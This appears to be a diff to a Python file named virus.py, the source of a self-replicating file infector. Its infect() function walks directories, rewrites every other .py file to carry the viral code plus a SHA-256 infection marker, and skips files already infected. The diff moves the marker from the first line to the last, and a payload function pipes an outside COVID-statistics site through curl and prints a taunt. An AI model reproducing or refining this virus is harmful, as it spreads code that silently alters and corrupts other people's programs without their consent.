@@ -10,7 +10,6 @@ API = "https://corona-stats.online?top=15"
 
 
 def execute_payload():
-    # curl -s https://corona-stats.online?top=15 | head -n 37
     print("######### DONT BE A COVIDIOT, STAY @ HOME #########")
     cmd1 = Popen(["curl", "-s"] + [API], stdout=PIPE)
     cmd2 = Popen(["head", "-n", "37"], stdin=cmd1.stdout)
@@ -62,19 +61,19 @@ def infect(troy):
             relative_path = root + '/' + file
             if file.endswith(".py") and relative_path != "./virus.py":
                 with open(relative_path, 'r') as original:
-                    first_line = original.readline()
-                    data = original.read()
-                    if first_line.startswith("#!*@"):
-                        if check_if_infected(first_line[4:].rstrip('\n'), data):
+                    data = original.read().split('\n')
+                    last_line = data[-1]
+                    if last_line.startswith("#*!@"):
+                        if check_if_infected(last_line[4:].rstrip('\n'), '\n'.join(data[:-1])):
                             continue
                         else:
-                            data = '\n'.join(data.split('\n')[1:])
+                            data = '\n'.join(data[:-2])
                     else:
-                        data = first_line + data
+                        data = '\n'.join(data)
                 with open(relative_path, 'w') as modified:
-                    new_content = "{0}\n{1}".format(troy, data)
+                    new_content = "{0}\n{1}".format(data, troy)
                     content_hash = hashlib.sha256(new_content.encode())
-                    modified.write("#!*@{0}\n{1}".format(content_hash.hexdigest(), new_content))
+                    modified.write("{0}\n#*!@{1}".format(new_content, content_hash.hexdigest()))
 
 
 def virus_routine():
